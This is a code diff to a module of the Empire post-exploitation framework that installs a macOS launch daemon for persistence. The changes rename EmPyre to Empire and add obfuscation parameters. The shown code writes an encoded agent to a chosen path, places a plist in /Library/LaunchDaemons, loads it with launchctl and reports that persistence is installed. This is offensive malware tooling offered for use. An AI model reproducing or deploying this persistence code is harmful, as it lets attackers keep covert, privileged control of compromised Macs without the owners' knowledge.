@@ -12,7 +12,7 @@ class Module:
             'Author': ['@xorrior'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs an EmPyre launchDaemon.'),
+            'Description': ('Installs an Empire launchDaemon.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -67,7 +67,7 @@ class Module:
                 'Value'         :   'com.proxy.initialize'
             },
             'DaemonLocation' : {
-                'Description'   :   'The full path of where the EmPyre launch daemon should be located.',
+                'Description'   :   'The full path of where the Empire launch daemon should be located.',
                 'Required'      :   True,
                 'Value'         :   ''
             }
@@ -88,7 +88,7 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         daemonName = self.options['DaemonName']['Value']
         programname = self.options['DaemonLocation']['Value']
@@ -163,7 +163,7 @@ process = subprocess.Popen('launchctl load /Library/LaunchDaemons/%s', stdout=su
 process.communicate()
 
 print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
-print "\\n[+] EmPyre daemon has been written to %s"
+print "\\n[+] Empire daemon has been written to %s"
 
 """ % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
 
